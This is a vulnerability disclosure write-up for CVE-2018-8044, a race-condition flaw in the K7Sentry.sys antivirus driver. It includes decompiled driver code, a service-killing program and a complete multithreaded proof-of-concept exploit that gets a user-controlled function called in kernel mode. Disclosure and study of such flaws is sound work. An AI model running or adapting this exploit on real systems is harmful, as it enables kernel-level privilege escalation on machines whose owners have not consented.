
# CVE-2018-8044
## Related Issues
* [CVE-2017-16551](../CVE-2017-16551/readme.md)
* [CVE-2017-16553](../CVE-2017-16553/readme.md)
* [CVE-2017-16555](../CVE-2017-16555/readme.md)
* [CVE-2017-16557](../CVE-2017-16557/readme.md)


# Product / Component Affected

Product: *K7 Antivirus Premium 16.0.0.2?*

Component: *K7Sentry.sys 15.1.0.70*

# Details
This issue was identified while assessing the mitigations put in place for the previous 4 issues identified in the related issues.
*Note: This writeup assumes and understanding of [CVE-2017-16551](../CVE-2017-16551/readme.md) as it builds upon that understanding.*

Two mitigations were put in place to prevent the previous vulnerability from working specifically:
* A process ID copmarison against a global one
* Ensures that a field we need to be -1, can not be -1

```C++
// sub_40A5A0 
int __stdcall QueryInfoWithCallbackWrapper(IoControlBuffer *a1)
{

    if ( g_ClientPort_dword_41A8EC )
    {
        // Mitigation 1: Checks that our ProcessID matches some global one
        if ( g_pCurrentProcessId == PsGetCurrentProcessId() )
        {
            ppUnk3 = (unk3 **)a1->pInputBuffer;
            if ( ppUnk3 )
            {
                if ( a1->pOutputBuffer && a1->dwInputBufferLength == 8 && a1->dwOutputBufferLength >= 4u )
                {
                    v2 = *ppUnk3;
                    v3 = a1->pdwIoStatusInformation;
                    // Mitigation 2: As you can see from below, it forces a field which we need 
                    // to be -1, to be NOT -1
                    // CHECK LOCATION
                    if ( IsInputValid(*ppUnk3) )
                    {
                        *v3 = 4;
                        *(_DWORD *)a1->pOutputBuffer = QueryInfoWithCallback((int)v2);
                    }
                    else
                    {
                        *v3 = 0;
                    }
                }
            }
        }
    }
    return 0;
}

unsigned int __stdcall QueryInfoWithCallback(unk3 *pUnk3)
{
    // ... Locals ..
    if ( pUnk3->must_be_K != 75 )
        return 0;
    // USE LOCATION
    unk3_field_1 = pUnk3->must_be_0xff;
    if ( unk3_field_1 )
    {
        if ( unk3_field_1 != 1 && unk3_field_1 != 2 )
        {
            if ( unk3_field_1 != -1 )
                return 0;
            pUnk9 = pUnk3->pUnk9;
            if ( !pUnk9 )
                return 0;
            pfnSomething = (int (__cdecl *)(int))pUnk9->pfnQueryInformationFile_10;
            if ( !pfnSomething )
                return 0;
            v8 = pfnSomething(pUnk3->hFile);
            // ...
        }
        // ...
    }
    // ...
}

// sub_40AE6A
char __stdcall IsInputValid(unk3 *pUnk3)
{
    char bSuccess; // dl

    bSuccess = 0;
    if ( pUnk3 >= (unk3 *)MmHighestUserAddress && pUnk3->must_be_K == 75 && pUnk3->must_be_0xff != -1 )
        bSuccess = 1;
    return bSuccess;
}
```

## Defeating PID Protection
The first mitigation is comparing the PID of the calling process with that stored in a global at 0x41A8F0 (g_pCurrentProcessId). This is only modified in 3 places:
* Handler for 0x95002588 which will set the value to the calling process, if it is 0
* When an IRP_MJ_SHUTDOWN occurs
* When the Process of that PID closes.

When it is running, the PID is for the K7TSMngr.exe service which is running as SYSTEM in Session 0.

Therefore, the first two options of the Control Code, or closing the machine down won't work. So we need to kill off that process.

For the PoC of this vulnerability, the most effect way I found of killing off this process was to launch a "killing process off" at SYSTEM integrity level, then debug the K7TSMngr manager, and then kill off my process, taking down the service.

Therefore this PoC is from SYSTEM --> Kernel

*Note: When I started looking at the service (after reporting this bug) many other ways to kill the process came out, which can be done from LOW integirty. For example you could chain together CVE-2018-8724 (Arbitary process creaton as SYSTEM from LOW), with this to get from LOW UM, to Kernel.*

## Defeating the not -1 check
unk3
+00: Must be K
+01: 0xFF
+02: Don't care
+03: Don't care
+04: Don't care
+05: Don't care
+06: Pointer to unk9

The check in sub_40AE6A (IsInputValid) is also not sufficient as there is a Time of Check, Time of Use (TOCTOU)/Race Condition. The check in sub_40AE6A (IsInputValid) reads the value from unk3 (has to be in the Kernel), and then in QueryInfoWithCallback, it re-reads the same buffer, with the assumption that it hasn't changed. There is a small window of a few 10's of instructions where the check/use occurs which if we can set byte 1 of our unk3 structure to be 0 we will pass the "IsInputValid" function check, and then flip it back to 0xFF so we can get the function callback.

In our previous scenario, we crafted unk3 in the driver's global memory using a variety of IOCTLs therefore we can use multiple threads and connections to the driver to modify this memory flipping the byte between 0xff and 0x00. Each attempt doesn't have any side effects so this can continuously attmpted. The PoC code does this and can achieve exploitation on a dual core machine between 30-60 seconds. 


# PoC Code
The PoC code performs the following:
* Works out where the driver is so we don't have to hard code it
* Opens the K7SentryCommPort1 as this is checked, we don't use it just open it. It was opened, but when we killed the service it closes this connection.
* Creates three threads to do the TOCTOU.
    * *Thread 1*: Sets up some global memory to match the structure identified in previous CVEs, however using different IOCtls. Then continually calls the vulnerable IOCtl 0x95002867 or 0x9500286B or 0x95002873 or 0x9500286F. When the IOCtl fails, we just get an error code back so can keep trying.
    * *Thread 2*: This has a job to modify a small amount of global memory to be K and then 0. This is because these two values will pass the check which is performed on calling the vulnerable IOCtls. There is a specifically check for the use of 0xff in that. So we want to make sure the Thread_1 execution gets past this part
    * *Thread 3*: This threads's job is to modify the same global memory as Thread 2, but change it to K and FF so in the code AFTER the check, it will take a different path through, follow the structure and assume it is a function pointer which we control.
* The basic presmise is between the check and the use we want to flip the byte from 0 to ff between the check and use of it.


Service Killer Code:
```C++
// Launch this as system with the PID of the K7TSMngr service and it will kill it
#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

int wmain(int argc, wchar_t** argv)
{
	HANDLE hProcess = NULL;

	if (argc != 2)
	{
		printf("Usage: <Pid>\r\n");
		return 0;
	}
	
	DWORD dwPid = wcstoul(argv[1], NULL, 10);

	//
	// Open the process for debugging, when we exit the process will die :)
	//
	if (!DebugActiveProcess(dwPid))
	{
		printf("Error: DebugActiveProcess failed: 0x%08x\r\n", GetLastError());
	}

	return 0;
}

````
Exploit Code:

```C++
#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <fltUser.h>

#pragma comment(lib, "FltLib.lib")

#pragma pack(push)
#pragma pack(1)

typedef struct _INBUFFER_95002558
{
	BYTE arrPadding[0x14];
	BYTE bMustBeK;
	BYTE Padding_16;
	BYTE b0orFF;
	BYTE arrPadding604[602];
} INBUFFER_95002558, *PINBUFFER_95002558;

typedef struct _UNK9
{
	DWORD offset_0;
	DWORD function_ReadFile;
	DWORD function_WriteFile;
	DWORD function_SetInformationFile;
	DWORD function_Query;
} UNK9, *PUNK9;


LPVOID g_k7Base = NULL;

#pragma pack(pop)

//
// This fills in the K and 0 or FF in a location that is 4 bytes away from the pointer we control. 
// This won't "succeed" but will do enough to set the right data. 
//
VOID SetControllingGlobalData(HANDLE hDevice, BYTE b0OrFF)
{
	INBUFFER_95002558 stInput = { 0 };
	stInput.bMustBeK = 'K';
	stInput.b0orFF = b0OrFF;

	DWORD dwBytesReturned;
	DWORD dwOutput;

	// This will probably fail but that is fine because we need to partially succeed to setup the globals
	if (!DeviceIoControl(hDevice, 0x95002558, &stInput, sizeof(stInput), &dwOutput, 4, &dwBytesReturned, NULL))
	{
		printf("Error: SetControllingGlobalData 0x%02x\r\n", b0OrFF);
	}
}

//
// This should be called back from the kernel if we managed to win the TOCTOU race
//
VOID __cdecl KernelCallbackRaceCondition(HANDLE hFile, DWORD dwUnknown)
{
	__asm
	{
		mov eax, 0xaaaaaaaa
		mov ebx, 0xbbbbbbbb
		mov ecx, 0xcccccccc
		mov edx, 0xdddddddd
		mov esi, 0xd00dd00d
		mov edi, 0xcafecafe
		mov DWORD_PTR[0xCAFED00D], 0xcafecafe
	}
}

//
// This fills in a buffer in a known location which we will reference later. Notably this has the 
// pointers to teh callback routines which I've just pointed to the same place.
//
VOID SetupFixedGlobalDataAndFnPointers(HANDLE hDevice)
{
	BYTE outBuffer[0x8000] = { 0 };
	BYTE data[0x8000] = { 0 };

	memset(data, 0x41, sizeof(data));
	DWORD dwBytesReturned = 0;

	PUNK9 pstUnk9 = (PUNK9)data;
	// This must not be 0;
	pstUnk9->offset_0 = 1;

	pstUnk9->function_ReadFile = (DWORD)KernelCallbackRaceCondition;
	pstUnk9->function_WriteFile = (DWORD)KernelCallbackRaceCondition;
	pstUnk9->function_SetInformationFile = (DWORD)KernelCallbackRaceCondition;
	pstUnk9->function_Query = (DWORD)KernelCallbackRaceCondition;


	printf("Setting up global buffer\r\n");

	//
	// This will fill the buffer at K7Sentry+0x1A960
	//
	if (!DeviceIoControl(hDevice, 0x95002580, data, sizeof(data), outBuffer, sizeof(outBuffer), &dwBytesReturned, NULL))
	{
		printf("Error: 0x%08x\r\n", GetLastError());
	}
	else
	{
		printf("Success: Got data into global");
	}

}

VOID AttemptTocTouCall(HANDLE hFile)
{
	DWORD dwDriverBase = (DWORD)g_k7Base;
	DWORD dwStartOfStructure = 0x1A960+dwDriverBase-6;

	BYTE data[0x8000] = { 0 };
	BYTE outBuffer[0x8000] = { 0 };

	memset(data, 0x41, sizeof(data));
	DWORD dwBytesReturned = 0;
	(*(DWORD*)data) = dwStartOfStructure;

	//
	// INFORMATION: These are the 4 "flawed" areas as there will need to be 4 fixes put in place.
	// Uncomment to trigger the bug on the various Control Codes
	//

	// ReadFile
	//if (!DeviceIoControl(hFile, 0x95002867, data, 16, outBuffer, 4, &dwBytesReturned, NULL))

	// WriteFile
	//if (!DeviceIoControl(hFile, 0x9500286B, data, 16, outBuffer, 4, &dwBytesReturned, NULL))

	// QueryFile
	//if (!DeviceIoControl(hFile, 0x95002873, data, 8, outBuffer, 4, &dwBytesReturned, NULL))

	// SetInformationFile
	if (!DeviceIoControl(hFile, 0x9500286F, data, 16, outBuffer, 4, &dwBytesReturned, NULL))
	{
		printf("Error: 0x%08x\r\n", GetLastError());
	}
	else
	{
		//printf("Success: Got data into global\r\n");
	}
}

DWORD WINAPI TpSetExploitMagics(LPVOID lpParameter)
{
	//
	// This thread will set the global variables to be K and FF which is required to trigger the exploit
	//
	// This is achieved by just looping the 0x95002558 IOCTL
	//
	HANDLE hDevice = CreateFileW(L"\\\\.\\k7sentry", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("TpSetExploitMagics!Error: Couldn't open a handle to the device\r\n");
		return 0;
	}

	while (TRUE)
	{
		SetControllingGlobalData(hDevice, 0xFF);
	}

	return 0;
}

DWORD WINAPI TpSetPassValidationMagics(LPVOID lpParameter)
{
	//
	// This thread will set the global variables to be K and 0 which will pass the test as to whether 
	// we should be able to continue.
	//
	// We need to open tour own connection to the driver to prevent synchrinization
	//
	HANDLE hDevice = CreateFileW(L"\\\\.\\k7sentry", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("TpSetPassValidationMagics!Error: Couldn't open a handle to the device\r\n");
		return 0;
	}

	while (TRUE)
	{
		SetControllingGlobalData(hDevice, 0);
	}

	return 0;
}

DWORD WINAPI TpTriggerExploit(LPVOID lpParameter)
{
	//
	// This will attempt to call the vulnerable function
	//
	HANDLE hDevice = CreateFileW(L"\\\\.\\k7sentry", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("TpTriggerExploit!Error: Couldn't open a handle to the device\r\n");
		return 0;
	}

	// This fills in the buffer that will be dereferenced to point to our functions.
	SetupFixedGlobalDataAndFnPointers(hDevice);

	while (TRUE)
	{
		AttemptTocTouCall(hDevice);
	}

	return 0;
}

LPVOID GetDriverBaseAddress(PWSTR pszDriverName)
{
	LPVOID arrDriverBases[0x1000] = { 0 };
	DWORD cbNeeded = 0;

	if (EnumDeviceDrivers(arrDriverBases, sizeof(arrDriverBases), &cbNeeded))
	{
		for (DWORD i = 0; i < cbNeeded / sizeof(arrDriverBases[0]); ++i)
		{
			WCHAR szDriverName[MAX_PATH] = { 0 };
			if (GetDeviceDriverBaseNameW(arrDriverBases[i], szDriverName, _countof(szDriverName)))
			{
				printf("0x%p\t%S\r\n", arrDriverBases[i], szDriverName);

				if (wcsncmp(szDriverName, pszDriverName, wcslen(pszDriverName)) == 0)
				{
					return arrDriverBases[i];
				}
			}
		}
	}

	return NULL;
}


int wmain(int argc, wchar_t** argv)
{
	//
	// Get the base address of the driver because we need it to pass into a IOCtl
	//
	g_k7Base = GetDriverBaseAddress(L"K7Sentry.sys");
	printf("DriverBase: 0x%p\r\n", g_k7Base);

	//
	// Open a handle to the communications port. This is required to pass some of the jmp statements.
	// Typically this is opened by the K7RTScan application but we've just killed that off!
	//
	HANDLE hCommPort;
	HRESULT hr = FilterConnectCommunicationPort(L"\\K7SentryCommPort1", 0, 0, 0, 0, &hCommPort);
	if (!SUCCEEDED(hr))
	{
		printf("Couldn't create communication port: 0x%08x\r\n", hr);
		return 0;
	}
	
	//
	// The goal of the next bit is to have the driver's global memory in a state which will pass one 
	// check, early on in the code, and that global memory to be changed before it is used a few
	// instructions later.
	// Therefore we have three threads:
	// * One which sets specific bits of gloabl memory to K and 00 to pass the check
	// * One which sets the same partfs ot global memory to K and FF to make it exploitable
	// * An attempt thread which keeps trying to call the vulnerable functions
	// There is no side effect to an attempt so you can keep trying.
	//
	printf("Attempting LPE TOCTOU, fingers crossed for BLUE or breakin in the debugger...\r\n");

	HANDLE hSetGlobalsThread = CreateThread(NULL, 0, TpSetExploitMagics, NULL, 0, NULL);
	if (hSetGlobalsThread == NULL)
	{
		printf("Error: Creating thread to continue to set the magics FF\r\n");
		return 0;
	}

	HANDLE hGlobals00 = CreateThread(NULL, 0, TpSetPassValidationMagics, NULL, 0, NULL);
	if (hGlobals00 == NULL)
	{
		printf("Error: Creating thread to continue to set the magics 00\r\n");
		return 0;
	}

	HANDLE hExploitTrigger = CreateThread(NULL, 0, TpTriggerExploit, NULL, 0, NULL);
	if (hExploitTrigger == NULL)
	{
		printf("Error: Creating thread to continue to trigger the exploit failed\r\n");
		return 0;
	}

	Sleep(INFINITE);

	return 0;
}

```